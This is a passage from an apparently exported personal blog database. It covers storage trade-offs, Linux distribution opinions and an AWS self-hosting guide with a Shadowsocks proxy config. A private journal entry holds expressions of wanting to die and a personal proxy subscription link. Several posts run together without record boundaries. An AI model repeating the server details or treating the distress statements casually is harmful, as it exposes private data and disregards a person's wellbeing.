infeasible since it involves moving a huge amount of objects. \n\nOther providers like Cloudflare R2 (S3 compatible) use specific endpoints for each account and don't charge you based on unauthorized requests.\n\nIn Object Storage you either upload, delete, or replicate. There is only a flat namespace, and you store objects with \"/\" to create a fake sense of directory hierarchy. There is no \"rename\" in the traditional sense, and the `clone` command is essentially replicating and deleting. Some companies like Azure address this by introducing Directory Buckets with more complicated designs. Amazon also introduced Directory Buckets, but fairly recently, in 2023.\n\nThus, frequent \"update\" operations to S3 become very cumbersome. That's why it's primarily for binary blobs or backups.\n\nSome providers charge you for moving objects in the same region, essentially \"renaming\". For example, I incurred a 88 dollar bill in Cloudflare R2 cold storage after hoarding videos for \"renaming\" the \"directories\" frequently\n\nThe colder the storage is, the more time you must store since colder storage is cheaper. Deep archives typically require you to store for at least 180 days, while Glacier Storage ones require you to store for around 30 days. You can delete them, but you will get charged nonetheless.\n\n## Database\n\n### Use Cases\n\nThe database is the backend of all web services out there.\n\nSql works best with structured data clear relationships and ACID compliance, while Nosql works best for data that doesn't have that many structures and where high speed and scalability are priorities. There are also specific databases like Graph database.\n\nBut the lines are very much blurred. Many modern NoSQL databases can handle structured data well, like using Mongoose and MongoDB. [Someone also suggested using Postgres for everything](https://old.reddit.com//r/programming/comments/zk3hbg/just_use_postgres_for_everything/). There is a recent trending database called TimeScale, built on top of Postgres with faster queries.\n\nMost open-source self-hosted projects (like FreshRSS, Matrix, Mastodon, Metabase, Miniflux, and Peertube) offer different storage options. For the development environment, you can use a Sqlite H2, or serverless embedded database, while for production it is recommended to use Postgres or MariaDB.\n\nAnyway, it doesn't really matter if the database is small, in my case. Like, optimizing is not as easy as doubling the RAM.\n\nNoSQL database can be utilized for key-value stores, as is the case with AWS DynamoDB. You can store the secrets and important keys in this database separately.\n\n## Pros\n\nThe database works well for frequent read, write, and updates. It is designed to handle these operations efficiently by using a B+ tree.\n\nThe database can be distributed. Thus, it is scalable. Sadly I haven't had much research into this area, so I lack personal knowledge. But I know that Google has lots of these in its applications like search, YouTube, etc.\n\nSearching can be achieved by utilizing a database. Mastodon uses optional ElasticSearch for full-text search. Database offers queries that are highly efficient and full control for the user so that you can run a lot of queries and return in a very efficient fashion, not achievable using disks or S3.\n\nThe database is secure in the sense that you can create different users (in, for example, Postgres) and give them the least privileges. There are also encrypted databases out there like CryptDB.\n\n## Cons\n\nDatabase doesn't work well with blobs, again, just fact-of-life.\n\nThe database needs frequent backups, this can be achieved by an AWS Lambda function or a job in a managed RDS service in AWS.\n\nDatabase needs carefully crafting to work seamlessly with different JSON and CSV dumps. Importing JSON and CSV dumps in MongoDB can lead to corruption. Sometimes dumping it directly isn't a bad option if something is only used for backups.\n\n## Git\n\n### Use Cases\n\nGit is primarily used for storing code for devs. However, git is also an excellent choice for storing important documents, config dumps, or any files that benefit from having a history.\n\nGit excels at text-heavy documents, maintaining a clear history of commits.\n\n### Pros\n\nGit is best for collaboration and merging code from PRs. GitHub has a generous free tier. Git is fast. Git is used in almost every popular open-source code out there (with Mozilla using `hg`)\n\n### Cons\n\nGit works horribly with large binary blobs. This is just a fact of life.\n\nWorking with Git needs careful planning to avoid bloating the Git repo. If you commit a large binary blob in git then delete it and don't erase the git history, you are essentially bloating it up. Please stop storing large blobs in Git, this makes everyone's life miserable. \n\nFor cloning it's best to shallow clone for large repos, since a large codebase has thousands of commits, and you likely don't need that much commit history.\n\nSome argue that Github isn't secure, since even for private repos Github employees can view your code, which is likely trained on LLMs. But this is a limitation to GitHub only. You can [self-host a Gitea](https://git.jimchen.me).\n\n## Raw File Storage\n\nStoring files that are frequently used directly on servers isn't very beneficial. If the files are small, then it benefit from using a database, achieving better performance and organization. If the files are large blobs, then using S3 can achieve much higher scalability. There are many more S3 providers database providers and git providers out there anyway.\n\nAlso, you have to implement a background process to backup these files frequently since raw servers might go down or run out of space/memory at any time.\n\nCommercial solutions like Google Docs/Google Slides often utilize large NoSQL in the backend to support specific types of editing.\n\nOf course, if the files don't need version control only need a single version, and need frequent updates, then raw files on disk might be a good choice. But you will probably need to upload the whole file back to disk anyway on each edit, so it's not much better than using S3 for this.\n\n## Intersections\n\nThere are many intersections of these, like version-control-database(See [Dolt](https://www.dolthub.com/blog/2021-11-26-so-you-want-git-database/#using-git-as-a-database)), git-lfs(largely used in Huggingface, where you store the model weights from Models in Object Storage). It's like utilizing both of these technologies together. \n\n## Conclusion\n\nCurrently, I utilize git for most general small files out there. I use a database for all my servers hosted services and my blog. I use S3 for large video blobs and data hoarding.", "date": {"$date": "2024-09-09T14:22:08.884Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dee6"}, "title": "Thoughts", "type": "private", "access": 3, "body": "Nice!\n\nI figured out the deal with private and public IP during this incident.\n\nShould I use DDOS protection in Cloudflare?

Just wanna tell you I hate everybody there.\n\nJust wanna tell you I am already pretty much broken.\n\nI hate social media. I have no time. I suck.\n\nI am so so tired. I suck shit. Everything sucks.\n\nI am tired, struggling, and want to die.\n\nYouTube proved to be stupid again.\n\nYouTube unlocked till 4:00 PM.\n\nTouchpad problem makes me more productive since it stops me from wasting time in Zombsroyale.\n\nToday is Mid Autumn Festival. \n\nA lot of problems are far more complicated than what I initially would have thought. Actually a lot of problems are very very specific and once you understand what it means, it isn't a problem anymore.\n\nI finally discovered the problem of my touchpad, guys. So basically the touchpad would die when I chunk the right hand side of it. This thing happens on multiple OS, and even on live environments, even in the BIOS menu. If I chunk the right hand side of the touchpad hard enough, the touchpad dies, but the trackpad and the two buttons near the touchpad(I use Thinkpad) still works.\n\nIf I don't chunk it, only \"touch\" it, nothing bad happens.\n\nObviously this prevents me from playing any sorta games. I don't ever use a mouse by the way. It's almost certainly a hardware problem\n\nBilibili unlocked till 2:00 AM\n\nhttps://jpvyyr.xyz/?L2Rvd25sb2FkQ29uZmlnL0NsYXNoLmFzcHg/ZXE9d2luZG93cyZ1cms9N2MxYTY2YTktZWQ1OC00ZDg4LTgxMGQtODUwOTk1NjQ3NWJhJm1tPTI0OTg4NiY=\n\nI do miss Mastodon but like it's just better here. \n\nThen archive it like once a month.\n\nI will be trying to apply some syntax highlighting maybe?\n\nI will be living here for life I guess.\n\nAlso I am already enjoying the Markdown Parser.\n\nAgain, like basically I would need a TOC to navigate this good.\n\nSorry Mastodon but I am leaving you for a second time now.\n\nI am not saying these other apps ain't important.

Ubuntu 24 Desktop is almost 6 GiB downloading and comes with a dock and Yaru themes, and a million other bloated software. Ubuntu also always has a message \"Upgrade to Pro\" when updating the apt. Ubuntu has a goddamn snap, which is useless and stupid, largely criticized by developers. Moreover, when you attempt to install a package after snap gets removed(the package is in a snap), snap attempts to install itself again.\n\nIn fact, installing Clash Verge(Tauri) requires installing 2 PPA packages from Launchpad first. And the Launchpad website is sometimes down.\n\nOf course, all of these can be bypassed easily. Remove the `gnome-shell` and install `vanilla-gnome-desktop` instead. Change fonts to Cantarell, and change the theme to Adwaita. Remove all packages installed by Snap and hold the Snap to prevent it from installing itself in the future. Remove `Yelp` and a million Gnome bloatware one by one. Disable the `Upgrade to Pro` message. Then you are good to go.\n\nUbuntu has so many outdated packages that it uses for the sake of `stable`. The default node is version 12 (version 22 has been out for a long time). You need to remove and install it again from Github.\n\nAnyway, my servers use Ubuntu and under the hood everything works, snap is primarily for GUI apps so I haven't bothered to remove it. Ubuntu isn't bad and can be easily \"finetuned\" to a comfortable state. \n\n## About Debian\n\nDebian is quite good, I would say. It is basically Ubuntu with a lot less bloat, and a lot more \"free\" principles. Most likely you would need to enable the nonfree repos to use it.\n\nSome packages in Debian default have been tampered with, like `Chromium` doesn't allow you to use Google as a search engine if you run `sudo apt install chromium`. I like Google and don't care about my privacy so this enrages me. Anyways, turns out it can be easily bypassed by resetting the Chromium or simply using Google Chrome.\n\nBut when I was using Debian sometimes the Gnome Shell would break. I didn't really know why this happened though, I now think it might be related to the GPU acceleration settings.\n\n## About ArchLinux\n\nThis one I actually used for a really long time. Long story short, ArchLinux has a lot of unnecessary hype in it, which is quite unnecessary from an efficient user's perspective. \n\nI used to be a die-hard fan, but didn't learn anything new from using ArchLinux, and consistently failed in school, and wasted a lot of time.\n\nFor example, every people would repeat ArchLinux comes without GUI, and this is for people to \"learn\". But I view this as a limitation rather than a \"strength\" or \"niche\", since Ubuntu and Fedora also have server images that are technically installable on laptops, and they work the same, so you can also \"force yourself in a cli environment\" (the main similarity is that you have to use your cli to connect to the Internet). Most distros have different iso for both server and desktop ones, and the server comes very barebone(for customization).\n\nAnd Arch isn't uninstallable, it's rather very easy to install, like, just partitioning the disks from an external drive, then booting into it and connecting to the Internet and everything comes. But the point is why don't we boot into an external GUI drive? If there is GUI why don't we utilize it? We can boot into a Gnome environment and do the exact same thing(partitioning the disks, downloading the image into it, installing software, and debugging). In fact, booting into an external live environment is a very efficient way of debugging when your computer fails to boot, which happened to me many many times(at least 10 times, which cost valuable time), and I would want a GUI to search and do stuff (because I have a poor memory and can't memorize all commands at first try). Ubuntu and Fedora work similarly, only they have all the commands preconfigured, or you can install them with your own commands, so you have the option to \"learn\" or not, in Arch, you MUST use your own commands.\n\nAlso, [pacman isn't much different from apt](https://old.reddit.com//r/archlinux/comments/2uxd5c/why_did_arch_create_pacman_instead_of_using_apt/), and for me like the downloading speed matters far more than the installation speed(if it was pre-compiled). So it doesn't make much of a difference.\n\nRegarding the \"rolling release\", there are also rolling releases like Fedora-Rawhide and Debian Sid. They both have unstable rolling releases, part of the reason ArchLinux is never used in server environments. But the difference is that Debian and Fedora(or others) have \"stable\" ones too.\n\nRegarding \"AUR\", it is a wonderful community with different specs of all different packages, but for a normal user like me, I don't need anything other than less than 5 apps outside of the main repos. Also, anything supported in AUR almost always has packages ready in `deb` or `rpm`.\n\n## Why Do I Use Fedora?\n\nFedora is very user-friendly yet not as bloated as Ubuntu. It offers updated packages and doesn't advertise to you with `update to pro` or `snap`. Also, I am tired and I just want to settle down. \n\n## Future Implications\n\nDoing this unnecessary stuff really wasted so much of my time. I hope that in the future I will go with default and popular ones. I like Google and don't care about proprietary software and privacy, by the way.

Also migrating to aws gives a experience of working in an enterprise literally with so many configuration options like scaling things up and down.(using aws cloud utils to quickly configure the ram, disk usage). It was awesome.\n\n### How much money did I waste?\n\nI wasted a lot of money. At least 11 month of Proton Mail Subscription, 40 dollars in Linode, 40 dollars in PikaPod, 10-20 dollars in Runpod and VastAI, 25 dollars transferring the domain to AWS.\n\nBut then again, it was worth like experiencing things, but I would know better not to put money in those though.\n\n### Vendor Lock in?\n\nNo that's for enterprise. I can migrate stuff to azure quickly as well, or GCP(if Google can process the billing lol)\n\n### Going Back to Ubuntu\n\nYes! I am going back to Ubuntu! Though I might still use ArchLinux sometimes. This might sound, sad.\n\nWhy? Obviously because Ubuntu runs in servers. Literally like all the docker images or Machine learning environments you can find online is Ubuntu, and it runs like 30 percent of Internet or whatever. Surprisingly Ubuntu is much more popular in servers, and by using Ubuntu I don't have to transition between my laptop and the server.\n\nWell obviously don't instlal the `ubuntu-desktop` and just install the ubuntu server image on canonical's website and boot into a cli, then use a configuration file and Network Manager to connect to Internet, change the mirror, then update and upgrade, and install the gdm and vanilla gnome. Moreover configure the theme to be cantarell and disable crappy snap and things are good enough.\n\nI don't think there are much differences in using experience between Ubuntu and ArchLinux though. just with a different package manager, and using debs or AUR.\n\nGiven that Ubuntu already runs well in AWS t4, I won't be surprised if they run well on the Snapdragon Elite chips.\n\n### Wayland Issues\n\nThis might seem unrelated but wayland has issues with vscode and the mouse, so I went back to xorg. This also seem evident as my old system76 laptop was also having issues with its mouse lately(obviously after switching to wayland).\n\n### Ethical Concerns?\n\nI still like open-source, but using open source for everything is impractical and idealistic and I don't see the point of it when literally I face far more restrictions in my life. Open source softwares are a tool for me to quickly know about things and I appreciate them, however, those big companies aren't evil and did open source many of the best tools too, so I don't see a problem using their proprietary softwares as well(long as I know how to use it).\n\n### Misunderstandings of Minimalism\n\nSo there is a great misunderstanding in general about minimalism, particularly in software development.\n\nThe ultimate goal is practicality not idealism, so minimalism ultimately serve a goal, to enhance the user experience, not for meaingless idealism.\n\nThere are two kinds of minimalism, one is a barebone code, another is a modern, sleek design.\n\n### Barebone Programs - Min Effort\n\nThere are many barebone programs out there, like vanilla html website, tinyWM, LFS. These are examples of min effort or min code from the programmers.\n\n### Why Isn't it Practical?\n\nIt isn't practical because there are usually too many tinkering on the user's side to be done, they represent min effort, not minimalistic design.\n\nIt feels like eating raw fish or uncooked noodles for the user, while a true minimalistic design feels like eating some tailored polished,clean food.\n\n### What is a Minimalisitc Design?\n\nA good design is basically a design that promotes minimal distractions and modern, sleek interface for the user. Examples\n\nA minimalistic design also emphasizes efficiency. A minimalistic design can include signficant efforts from the programmer, to continously tune the UI to be better suited for different purposes and functional.\n\nA minimalistic design is usually very hard.\n\nSome examples include\n\n- Apple's Products\n- Next.js/Vercel\n- Tailwind CSS\n- Gnome\n- Justthedocs\n- Linode\n\nThese enhance the user experience(although I am not an Apple fan).\n\n### Functional and Complicated Design\n\nThat said, there are also designs that don't hide the complexities, like\n\n- AWS interface\n\nAlbeit having comprehensive functionality, I can easily navigate myself through to find the right solution.\n\nI will explain how to live on AWS in the 2020s. Specifically, in 2024. After using Linode and Cloudflare and various other services like vastai or RunPod or LambdaLabs or Google Colab I finally found AWS to be the solution to all!\n\n### LLM\n\nUse Amazon Bedrock for the most powerful LLM Claude-Sonnet-3.5, as of summer 2024, then set up a frontend like lobe-chat to utilize this in docker.\n\n### S3\n\nS3-compatible storage is the ubiquitous storage option and backend for most cloud drives out there. You would want to use S3 for all your storage, I mean literally, everything.\n\nGoogle Drive, or any kind of apps, lack the extent of customizability and control by so far! Create a script to backup Github to S3 everyday(just shallow clone for the most recent repos is ok)\n\nCall the Github API with `curl -s -H \"Authorization: token $TOKEN\" \"https://api.github.com/user/repos?per_page=100\" ` then like basically do something then shallow clone it, zip it to AWS. Do this on a ec2.\n\nYou would also want to backup documents(probably stored in a NoSQL like MongoDB) to AWS, it's simple, just periodically dump the MongoDB database zip it then upload to AWS.\n\nS3 is best for scaling and S3-compatible is the backend for nearly all media storage on the Internet!\n\n### SES\n\nAWS SES is simple yet really powerful and customizable email service that allows good filtering and complete control over the email(you can use `postfix` to host it too, but anyways, I am discouraged against the idea and when my server goes down I will stop receiving any emails).\n\nWhat's better, SES receiving emails can go automatically into your S3 bucket, making backups easy and manageable!\n\nThere is a workmail solution for SES which can enable IMAP so you can literally use your mail in any client including Gmail!\n\n### Storage Remotes\n \nObviously one misconfig can delete all my files, that's why beside AWS S3 I am using Backblaze B2 for its cheap pricing! I manually backup(basically sync) the S3 to B2 once in a while, and B2 is also S3-compatible.\n\n### Cloudfront CDN\n\nUse Cloudfront to deploy and distribute objects from your blog or documents fast as ever! It's really easy to set up and use with S3 Buckets!\n\n### IAM Policies\n\nSet up extensive IAM policies for each services to avoid using root too much, which can cause unintended destructions!\n\n### Secrets Manager\n\nManage all api keys here! Store them here (backed by AWS's nosql key value database), it's super easy and convenient.\n\nPlease don't connect to MongoDB on a http netwrk(it will simply get blocked!)\n\n### Docker on EC2\n\nOf course, we cannot forget docker on ec2. You can easily hookup with dockers and configure PWA for Android apps after dockerizing your favorite apps, like FreshRSS or RSSHub or Markdown Parser or StirlingPDF, anyways, like so convenient!\n\n### CloudWatch\n\nAfter all of these you would wanna check out CloudWatch for some monitoring! Add the websites endpoints and check if there are any errors easily!\n\n### Other Services I played with (but didn't use extensively)\n\nI also played with Lambda(serverless superfun), api gateways, basically a gateway for lambda or s3 bucket, Sagemaker (though I prefer hooking up Jupyter manually on EC2), Glacier(it became S3-glacier these days and considered legacy, basically a vault for colder storage), marketplace(buy premium for other apps on AWS).\n\n### Disaster Recovery\n\nSo yeah, what happens if AWS goes down? Well, I have Backblaze for my S3 data storage and I can quickly spun up docker images on another machine and I also have Gmail as my backup mail, so almost nothing goes wrong.\n\nIf something do go wrong it would be up for larger companies like Reddit, Github, HuggingFace, Vercel, Netflix, Dropbox, GradeScope, Amazon(the ecommerce platform), ... the list goes on to worry sick with their excellent silicon valley programmers!\n\nEverything can be self-hosted, and you can regain the digital freedom from that!\n\nWell, except for certain social media.\n\n### Self Hosting Proxy Server\n\nHook up a Shadowsocks server on a cloud vps and then copy the configuration to Clash locally, there you go.\n\nExpose the outbound ports, and start a docker container with the shadowsocks. \n\n```\nproxies:\n  - name: \"us-east-1-t4g-medium\"\n    type: ss\n    server: 3.228.73.172\n    port: 8388\n    cipher: aes-256-gcm\n    password: [hidden]\n    udp: true\n```\n\nWhat's more, doing this allows you to \n\n- Control the dns server to point to a family friendly DNS(use Cloudflare 1.1.1.3 filter out the distractions) \n- Don't have to pay for another vendor(except the VPS, where I also host like 20 docker machines, so it's pretty trivial)\n- Not be constantly blocked by Reddit or other websites (these vps endpoints of public providers got frequently flagged so you have to go through like manually verifying all the time)\n\n\n### Firewall?\n\nSo it is kind of like a firewall, in fact, if you search for adult contents under the 1.1.1.3 dns, what you get is \"Results hidden by SafeSearch\"\n\n\n![Image](https://cdn.jimchen.me/2fac2ad8-017d-497b-9f76-ad53e8cabae6-1719563642404.jpg)\n\n\nAnd when you try to change it well\n```\nYou can't change your SafeSearch setting right now because someone else, like a parent or administrator, controls settings on the network, browser, or device you\u2019re using\n```\n\n![Image](https://cdn.jimchen.me/2f248ab2-8209-4933-8e0e-b82cae48517e-1719563689900.jpg)\n\nThat's so nice!\n\nMoreover, there will be a speed increase when you use your own proxy in the server to work with the docker hosted stuff(because they are in the same server lmao)\n\n### Self Hosting Remote Storage Manager\n\nJust found this project on Github [https://github.com/alist-org/alist], it is so freaking good! Like, literally, has a beautiful interface with efficient management and streaming and control of all the remote data(s3, google drive, photo, you name it!)\n\nFilebrowser and Filestash are both pretty crappy in my opinion, with limited options and crappier interface, as well as low speeds and nonfunctioning bugs. Anyways, the alist is such a powerful management tool!\n\n![Image](https://cdn.jimchen.me/aa30fe19-d564-4822-be5f-7960e2db1761-1719562820390.jpg)\n\n![Image](https://cdn.jimchen.me/fe2c1abf-11fa-4370-b750-6211f9a68ece-1719562829269.jpg)\n\n### Self Hosting GPT frontend\n\nThis is so cool! Like seriously, an api wrapper is the first thing\n\nThis allows you to \n- Bypass Regional Restrictions\n- No rate limiting(far less rate limiting on API)\n- Don't have to rely on buggy ChatGPT frontend(or any other frontend)\n- Manage \"on demand\" usage instead of subscription fee\n\nI honestly don't understand why ChatGPT frontend constantly crashes(come on, it's using NextJS and is a large company, so I thought extensive testing is going on there, but it still constantly crash and frequently runs into bugs, like defaulting to GPT 3.5, not sure if it is intentional or not)\n\n### Self Host Markdown Parser(file manager)\n\nI don't like Joplin because it doesn't have a web interface. I mean, come on, why won't it have a web interface? Moreover it's syncing runs frequently into bugs.\n\nSo I wrote a markdown parser(with file management) myself. This allows me to edit seamless stuff from mobile to laptop and easily copy paste screenshots in blogs(like basically when I ctrl v in the browser it gets automatically uploaded to my S3 bucket with a url returned).\n\n\n\n### Conclusion\n\nSelf hosting offers a premium experience of everything with the perfect control (even control over pricing as you can choose the VPS and buy the capacities on the cloud).\n\nI am running 20 premium services on my cloud with only 4 GB of RAM, and everything works seamlessly.\n\nIt offers the user perfect control--that's exactly what I aim for. Like, control and convenience and not having to deal with companies(which becomes very inconvenient).\n\nI can literally live inside the cloud and not get out. After all with Openai and Gemini's generous free tier I am essentially only paying AWS, and nothing else. It allows me to manage my service in one place and focus on better stuff.\n\nI also really like Google, I mean, the Colab and the Drive and Gmail and Photo and Android, they are quite basic and convenient, and don't offer distractions or ads or forced subscriptions. Really good! I would like that too. I am not turning myself against popular services but rather focusing on control and convenience. The whole point of self hosting is the free legit premium experience I am having!\n\nSelf hosting made my life look hopeful admist the mental health crisis surrounding me lately. Anyways, these are just some of the many useful stuff.\n", "date": {"$date": "2024-07-18T00:00:00Z"}, "__v": 0}]
